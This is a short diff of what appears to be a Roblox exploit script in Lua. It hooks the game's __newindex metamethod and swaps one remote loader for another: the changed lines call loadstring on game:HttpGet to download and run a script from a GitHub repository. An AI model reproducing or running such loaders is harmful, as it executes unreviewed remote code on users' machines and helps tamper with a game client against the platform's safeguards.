@@ -71,5 +71,5 @@ __newindex = hookmetamethod(game, "__newindex", function(t, k, v)
     return __newindex(t, k, v)
 end)
 
-getgenv().ChatLogs = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/NBZion/scripts/main/Flare.lua", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/inceldom/dh/main/script",Atom2IsSkidded==EvenTheWhitelist))()
+
